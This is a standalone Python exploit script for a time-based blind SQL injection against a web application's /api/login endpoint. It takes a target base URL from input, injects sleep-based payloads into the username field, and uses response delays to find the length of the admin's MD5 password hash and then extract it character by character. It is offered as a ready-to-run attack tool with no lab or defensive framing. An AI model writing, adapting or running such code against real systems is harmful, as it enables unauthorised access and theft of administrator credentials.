import requests, time, json, string, sys

def guess_len(baseUrl, max):
    for i in range(max):
        payload = f"admin\" AND sleep(3) AND (length(password)>{i})-- -"
        data = {"username":payload, "password":"password"}
        res = requests.post(baseUrl + "/api/login", json=data)

        if int(res.elapsed.total_seconds()) >= 3:
            pass
        else:
            return i

def blind_sqli(baseUrl, length):
    chars = string.digits + "abcdef" # Characters in MD5 hash
    password = ''
    for position in range(length+1):
        for c in chars:
            payload = f"admin\" AND sleep(3) AND (substring(password,{position},1)='{c}')-- -"
            data = {"username":payload, "password":"password"}
            res = requests.post(baseUrl + "/api/login", json=data)

            if int(res.elapsed.total_seconds()) >= 3:
                password += c
                sys.stdout.write(f"\rFound it : {password}")
                sys.stdout.flush()
                break
            else:
                pass
    return password

def main():
    
    base = input("Base URL : ")
    assert (base.startswith("http") or base.startswith("https")) and not base.endswith("/"), "Invalid URL, provide an url with http or https prefix without / (webroot)"

    print("Phase 1\n Determining password string length")
    password_len = guess_len(base,35)
    print(" Password String Length:",password_len)
    
    print("Phase 2\n Guessing Admin Password")
    admin_password = blind_sqli(base, password_len)
    sys.stdout.write(f"\rAdmin Password : {admin_password}")
    sys.stdout.flush()

if __name__ == '__main__':
    main()